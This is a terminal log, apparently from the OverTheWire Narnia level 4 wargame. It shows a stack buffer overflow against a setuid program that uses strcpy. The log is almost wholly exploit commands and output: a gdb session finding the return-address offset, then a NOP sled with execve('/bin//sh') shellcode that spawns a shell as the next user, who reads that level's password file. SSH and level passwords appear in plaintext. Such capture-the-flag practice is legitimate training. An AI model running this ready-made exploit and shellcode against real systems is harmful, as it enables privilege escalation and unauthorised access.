Terminal  
===  
```  
ssh narnia4@narnia.labs.overthewire.org  
narnia4@narnia.labs.overthewire.org's password: thaenohtai <enter>  
narnia4@melinda:~$ cd /narnia  
narnia4@melinda:/narnia$ cat narnia4.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}
narnia4@melinda:/narnia$ gdb -q ./narnia4
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r $(python -c'print "A"*272 + "ABCD"')  
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia4 $(python -c'print "A"*272 + "ABCD"')

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()  
(gdb) x/300x $esp
0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacca
0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
0xffffd5e0:	0x0804825c	0xf7fc9000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0xb65fd7a7	0x8e8173b7	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd610:	0x00000000	0xf7ff04c0	0xf7e3b9e9	0xf7ffd000
0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
0xffffd640:	0x080485c0	0xf7feb160	0xffffd64c	0x0000001c
0xffffd650:	0x00000002	0xffffd78c	0xffffd7a2	0x00000000
0xffffd660:	0xffffd8b7	0xffffd8cd	0xffffd8dd	0xffffd8f1
0xffffd670:	0xffffd914	0xffffd928	0xffffd931	0xffffd93e
0xffffd680:	0xffffde5f	0xffffde6a	0xffffde75	0xffffded3
0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6c0:	0x00000020	0xf7fdac60	0x00000021	0xf7fda000
0xffffd6d0:	0x00000010	0x0f8bfbff	0x00000006	0x00001000
0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffd760:	0x00000000	0x00000000	0x8f000000	0x2b838899
0xffffd770:	0x002c24fa	0x1aa16102	0x698a5c22	0x00363836
0xffffd780:	0x00000000	0x00000000	0x00000000	0x6d61672f
0xffffd790:	0x6e2f7365	0x696e7261	0x616e2f61	0x61696e72
0xffffd7a0:	0x41410034	0x41414141	0x41414141	0x41414141
0xffffd7b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x42414141	0x00004443	0x00000000	0x00000000
0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8f0:	0x00000000	0x00000000	0x00000000	0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffd900:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd910:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd920:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd930:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd940:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd950:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd960:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd970:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd980:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd990:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd9f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda30:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda40:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffda60:	0x00000000	0x00000000	0x00000000	0x00000000  
(gdb) r $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia4 $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
process 8643 is executing new program: /bin/dash
$ exit     
[Inferior 1 (process 8643) exited normally]
(gdb) quit  
./narnia4 $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy  

```
